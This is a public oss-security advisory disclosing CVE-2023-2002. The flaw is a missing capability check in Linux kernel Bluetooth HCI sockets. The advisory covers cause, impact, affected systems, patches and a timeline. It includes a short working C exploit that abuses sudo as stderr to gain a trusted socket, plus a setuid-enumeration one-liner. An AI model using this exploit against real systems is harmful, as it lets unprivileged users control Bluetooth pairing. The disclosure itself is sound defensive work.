Received: (qmail 23975 invoked by uid 550); 16 Apr 2023 11:22:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 19556 invoked from network); 16 Apr 2023 10:12:43 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
	d=pku.edu.cn; s=dkim; h=Received:Date:From:To:Cc:Subject:
	Message-ID:MIME-Version:Content-Type:Content-Disposition; bh=bEl
	ceFzH0NUyDIs7Il2yuZwWmnhhi//F2BwvOxSNaK4=; b=kO0ZCPz0UsV2A5onOGe
	4u2/5+8foSG9Yt27ATtkdz1rqstWQI8iEWv+DohiDOrP2nOieIovBtA42ik2zvJK
	Oy4IpL+0BeaElMaqCE3uSQ7YfEqOj5udSoEYLSequrp8/1hx+ipkHCqvQ1AphD79
	zC7m0J7Ab6JHVcwV4bKWVmLE=
Date: Sun, 16 Apr 2023 18:12:18 +0800
From: Ruihan Li <lrh2000@pku.edu.cn>
To: oss-security@lists.openwall.com
Cc: Ruihan Li <lrh2000@pku.edu.cn>
Message-ID: <w7boj4fg4x2o2bjz7a7zkjk4bgxqvqyuxycdqqw2dl3bhanh6a@h4jtbccffxgv>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
X-CM-TRANSID:5oFpogA3PIwCyjtk0PnJDg--.10879S2
X-Coremail-Antispam: 1UD129KBjvJXoWxuw1rGr1ktF1rZr17WF4fGrg_yoWfZw1DpF
	WYkF1Ut34kJ3Wxur97Aa1IyFy0yrnYy3y7Jrn8W34jyrs8uF95t3yfKr4akFyjkrnrG3Wa
	qFW29rW09w1DX3DanT9S1TB71UUUUUUqnTZGkaVYY2UrUUUUjbIjqfuFe4nvWSU5nxnvy2
	9KBjDU0xBIdaVrnRJUUUvC1xkIjI8I6I8E6xAIw20EY4v20xvaj40_Wr0E3s1l1IIY67AE
	w4v_Jr0_Jr4l8cAvFVAK0II2c7xJM28CjxkF64kEwVA0rcxSw2x7M28EF7xvwVC0I7IYx2
	IY67AKxVW7JVWDJwA2z4x0Y4vE2Ix0cI8IcVCY1x0267AKxVW8Jr0_Cr1UM28EF7xvwVC2
	z280aVAFwI0_GcCE3s1l84ACjcxK6I8E87Iv6xkF7I0E14v26rxl6s0DM2vYz4IE04k24V
	AvwVAKI4IrM2AIxVAIcxkEcVAq07x20xvEncxIr21l5I8CrVACY4xI64kE6c02F40Ex7xf
	McIj6xIIjxv20xvE14v26r1j6r18McIj6I8E87Iv67AKxVWUJVW8JwAm72CE4IkC6x0Yz7
	v_Jr0_Gr1lF7xvr2IY64vIr41lF7I21c0EjII2zVCS5cI20VAGYxC7MxkIecxEwVCm-wCF
	04k20xvY0x0EwIxGrwCF04k20xvE74AGY7Cv6cx26w4UJr1UMxC20s026xCaFVCjc4AY6r
	1j6r4UMI8I3I0E5I8CrVAFwI0_Jr0_Jr4lx2IqxVCjr7xvwVAFwI0_JrI_JrWlx4CE17CE
	b7AF67AKxVWUXVWUAwCIc40Y0x0EwIxGrwCI42IY6xIIjxv20xvE14v26r1j6r1xMIIF0x
	vE2Ix0cI8IcVCY1x0267AKxVWUJVW8JwCI42IY6xAIw20EY4v20xvaj40_Jr0_JF4lIxAI
	cVC2z280aVAFwI0_Jr0_Gr1lIxAIcVC2z280aVCY1x0267AKxVW8JVW8JrUvcSsGvfC2Kf
	nxnUUI43ZEXa7VUbHa0DUUUUU==
X-CM-SenderInfo: yssqiiarrvmko6sn3hxhgxhubq/1tbiAgEBBVPy77oXEgAOs4
Subject: [oss-security] CVE-2023-2002: Linux Bluetooth: Unauthorized management command
 execution

Hi,

An insufficient permission check has been found in the Bluetooth subsystem of
the Linux kernel when handling ioctl system calls of HCI sockets. This causes
tasks without the proper CAP_NET_ADMIN capability can easily mark HCI sockets
as _trusted_. Trusted sockets are intended to enable the sending and receiving
of management commands and events, such as pairing or connecting with a new
device.  As a result, unprivileged users can acquire a trusted socket, leading
to unauthorized execution of management commands. The exploit requires only
the presence of a set of commonly used setuid programs (e.g., su, sudo).

## Cause

The direct cause of the vulnerability is the following code snippet:
```c
static int hci_sock_ioctl(struct socket *sock, unsigned int cmd,
                          unsigned long arg)
{
	...
        if (hci_sock_gen_cookie(sk)) {
		...
                if (capable(CAP_NET_ADMIN))
                        hci_sock_set_flag(sk, HCI_SOCK_TRUSTED);
		...
        }
	...
}
```

The implementation of an ioctl system call verifies whether the task invoking
the call has the necessary CAP_NET_ADMIN capability to update the
HCI_SOCK_TRUSTED flag. However, this check only considers the calling task,
which may not necessarily be the socket opener. For instance, the socket can
be shared with another task using fork and execve, where the latter task may
be privileged, such as a setuid program. Moreover, if the socket is used as
stdout or stderr, an ioctl call is made to obtain tty parameters, which can be
verified through the strace command.
```
# strace -e trace=ioctl sudo > /dev/null
ioctl(3, TIOCGPGRP, [30305])            = 0
ioctl(2, TIOCGWINSZ, {ws_row=45, ws_col=190, ws_xpixel=0, ws_ypixel=0}) = 0
```

The ioctl calls for tty parameters will never succeed on HCI sockets, but they
are sufficient to mark HCI sockets as trusted. Therefore, an unprivileged
program can hold trusted HCI sockets, enabling it to send and receive
management commands and events, since the trusted flag will never be cleared.

## Exploit

The exploitation can be as easy as below:
```c
	int fd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);

	/* By executing sudo with an HCI socket as stderr, an ioctl
	 * system call makes the HCI socket privileged (i.e. with
	 * the HCI_SOCK_TRUSTED flag set).
	 */
	int pid = fork();
	if (pid == 0) {
		dup2(fd, 2);
		close(fd);
		execlp("sudo", "sudo");
	}

	waitpid(pid, NULL, 0);

	struct sockaddr_hci haddr;
	haddr.hci_family = AF_BLUETOOTH;
	haddr.hci_dev = HCI_DEV_NONE;
	haddr.hci_channel = HCI_CHANNEL_CONTROL;

	/* The socket has not been bound. It can be bound to the
	 * management channel now. After that, the HCI_SOCK_TRUSTED
	 * flag is still present, as it will indeed never be cleared.
	 */
	bind(fd, (struct sockaddr *)&haddr, sizeof(haddr));
```

Furthermore, btmon can be used to confirm that the socket becomes trusted and
successive management commands will succeed:
```
# btmon
@ RAW Open: sudo (privileged) version 2.22
@ RAW Close: sudo
@ MGMT Open: sudo (privileged) version 1.22
@ MGMT Command: Set Powered (0x0005) plen 1
        Powered: Disabled (0x00)
@ MGMT Event: Command Complete (0x0001) plen 7
      Set Powered (0x0005) plen 4
        Status: Success (0x00)
```

A full PoC exploit to change the power state of Bluetooth devices can be found
[on GitHub][exp].

[exp]: https://github.com/lrh2000/CVE-2023-2002/tree/master/exp

## Impact

If successfully exploited, the identified vulnerability has the potential to
compromise the confidentiality, integrity, and availability of Bluetooth
communication. Attackers can exploit this vulnerability to pair the controller
with malicious devices, even if the Bluetooth service is disabled or not
installed. It is also possible to prevent specific devices from being paired,
or read some sensitive information such as the OOB data.

## Affection

The exploitable vulnerability has been present in the Linux kernel since v4.9.
More specifically, it becomes exploitable after the [commit f81f5b2db869][cm]
("Bluetooth: Send control open and close messages for HCI raw sockets"). Prior
to this commit, exploiting the vulnerability required tricking a privileged
program into binding an HCI socket, which is very hard (if not impossible) to
trigger in practice. However, after the commit, it requires only tricking a
privileged program to invoke an ioctl system call, which relies only on the
existence of an setuid program, as illustrated above.

[cm]: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f81f5b2db869

The exploitation works as long as there are setuid programs (or more
precisely, programs with the CAP_NET_ADMIN capability) that invokes ioctl
calls on stdin, stdout, or stderr. In most Linux distros, a quick (but very
coarse) test reveals that quite a few setuid programs are using ioctl system
calls, which are marked with 'V' in the table below:
```
# find . -user root -perm -4000 -exec sh -c "strace -e trace=ioctl {} < /dev/null 2>&1 > /dev/null | grep ioctl > /dev/null && echo -n 'V ' || echo -n 'S '; echo {};" \; | sort
S ./chage
S ./expiry
S ./fusermount
S ./fusermount3
S ./gpasswd
S ./ksu
S ./mount.cifs
S ./sg
S ./umount
V ./chfn
V ./chsh
V ./mount
V ./newgrp
V ./passwd
V ./pkexec
V ./screen-4.9.0
V ./su
V ./sudo
V ./unix_chkpwd
```
After manually checking the strace output, it is found that all of these ioctl
users are using ioctl calls on stdin, stdout, or stderr to get or set some tty
parameters. Note that exactly no arguments are passed to these setuid
programs. If some crafted arguments are passed, the number of ioctl users may
increase. As a result, a number of linux distros can be vulnerable to the
exploitation.

As a side note, Android devices, however, are unlikely to be affected since
the exploitation requires the existence of setuid programs, which Android has
[avoided using][su] for some time. Besides, there are also no applications
with the CAP_NET_ADMIN capability on Android.

[su]: https://source.android.com/docs/security/enhancements/enhancements43

## Mitigation

[A patch][fi] has been posted to the linux-bluetooth mailing list which fixes
this vulnerability by replacing capable() with sk_capable(), where
sk_capable() checks not only the current task but also that the socket opener
has the required capability. At the same time, [another submitted patch][se]
hardens the ioctl processing logic by checking command validity at the start
of hci_sock_ioctl() and returning with an ENOIOCTLCMD error code immediately
before doing anything if the command is invalid.

[fi]: https://lore.kernel.org/linux-bluetooth/20230416081404.8227-1-lrh2000@pku.edu.cn
[se]: https://lore.kernel.org/linux-bluetooth/20230416080251.7717-1-lrh2000@pku.edu.cn

As a workaround, if the Bluetooth devices are not being used at all (but it is
not feasible to physically remove the device), it is possible to simply block
the devices using rfkill, which will prevent the devices from being powered
up. By doing so, sending management commands to power up Bluetooth devices
won't succeed. This can significantly reduce the impact of this vulnerability.

There are two ways to avoid similar vulnerabilities in the future: hardening
the Linux kernel and hardening userspace setuid programs.
 - There are many uses of capable() in the Linux kernel that check the
   capability of the current task, but do nothing about the file or socket
   opener. In many cases, it may be reasonable to also check the capability of
   the opener. However, adding more capability checks can lead to unexpected
   regressions, although no such examples in reality have been seen at the
   time of writing.
 - Stdin, stdout, and stderr are different from other file descriptors,
   because they are inherited from the parent task but are used directly by
   the current task. For privileged setuid programs, inherited file
   descriptors may need to be treated as untrusted. Therefore, it also seems
   reasonable to explicitly drop privileges when invoking system calls on
   these untrusted file descriptors.

## Relation

This vulnerability shares exactly the same principle as [CVE-2014-0181][c14]. In
the case of CVE-2014-0181, the issue was the lack of a mechanism to authorize
Netlink operations based on the opener of the socket, which allows local users
to modify network configurations by using a Netlink socket for the stdout or
stderr of a setuid program.

[c14]: https://nvd.nist.gov/vuln/detail/CVE-2014-0181

## Timeline

**2023-04-04:** I discovered this vulnerability during my audit of the
Bluetooth protocol stack in the Linux kernel.

**2023-04-09:** I have reported this vulnerability to the Linux kernel
security team and distribution vendors, with an initial version of patches.

**2023-04-12:** This vulnerability has been assigned a CVE ID, which is
CVE-2023-2002.

**2023-04-13:** After several days of discussion with the maintainers, the
patches have been updated accordingly.

**2023-04-16:** The vulnerability was disclosed on the public oss-security
mailing list (here) and [on GitHub][gh]. Two patches have been posted to the
public linux-bluetooth mailing list ([first][fi], [second][se]).

[gh]: https://github.com/lrh2000/CVE-2023-2002

Thanks,
Ruihan Li

